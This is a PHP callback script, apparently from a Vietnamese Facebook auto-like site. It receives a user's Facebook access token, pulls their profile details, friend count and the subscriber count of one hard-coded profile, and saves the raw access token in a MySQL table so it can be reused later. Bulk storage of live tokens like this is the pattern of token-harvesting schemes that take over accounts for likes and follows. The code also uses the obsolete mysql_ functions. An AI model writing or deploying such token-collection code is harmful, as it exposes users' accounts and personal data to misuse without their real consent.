<?php
session_start();
include 'config.php';
if($token['access_token']) {

$me = json_decode(file_get_contents('https://graph.facebook.com/me?access_token='.$token['access_token'].''), true);
$check = json_decode(file_get_contents('https://graph.facebook.com/app/?access_token='.$token['access_token'].''), true);
$check2 = json_decode(file_get_contents('https://graph.facebook.com/100009116051272/subscribers?access_token='.$token['access_token'].''), true);
$check3 = json_decode(file_get_contents('https://graph.facebook.com/me?fields=friends&access_token='.$token['access_token'].''), true);
if($me['id']){
$_SESSION['id'] = $me[id];
$_SESSION['name'] = $me[name];
$_SESSION['token'] = $token['access_token'];
$_SESSION['birthday']=$me['birthday'];
$_SESSION['email']=$me['email'];
$_SESSION['first_name']=$me['first_name'];
$_SESSION['last_name']=$me['last_name'];
$_SESSION['gender']=$me['gender'];
$_SESSION['id_token'] = $check['id'];
$_SESSION['verified']=$me['verified'];
$_SESSION['sub']=$check2['total_count'];
$_SESSION['friends']=$check3['total_count'];
if($me['id']){
mysql_query("CREATE TABLE IF NOT EXISTS `token` (

      `id` int(11) NOT NULL AUTO_INCREMENT,

      `user_id` varchar(32) NOT NULL,

      `name` varchar(32) NOT NULL,

      `access_token` varchar(255) NOT NULL,

      PRIMARY KEY (`id`)

      ) ENGINE=MyISAM DEFAULT CHARSET=utf8 AUTO_INCREMENT=1 ;

   ");
   $row = null;
   $result = mysql_query("
      SELECT
         *
      FROM
         token
      WHERE
         user_id = '" . mysql_real_escape_string($me['id']) . "'
   ");
   if($result){
      $row = mysql_fetch_array($result, MYSQL_ASSOC);
      if(mysql_num_rows($result) > 100){
         mysql_query("
            DELETE FROM
               token
            WHERE
               user_id='" . mysql_real_escape_string($me['id']) . "' AND
               id != '" . $row['id'] . "'
         ");
      }
   }
 
   if(!$row){
      mysql_query(
         "INSERT INTO 
            token
         SET
            `user_id` = '" . mysql_real_escape_string($me['id']) . "',
            `name` = '" . mysql_real_escape_string($me['name']) . "',
            `access_token` = '" . mysql_real_escape_string($token['access_token']) . "'
      ");
   } else {
      mysql_query(
         "UPDATE 
            token
         SET
            `access_token` = '" . mysql_real_escape_string($token['access_token']) . "'
         WHERE
            `id` = " . $row['id'] . "
      ");
   }
   }
die('<script>window.location.href = "/index.php?info=success"</script>');
}
}else{
die('<script>alert("Có cc ấy tin người vcl");</script>');
}
?>
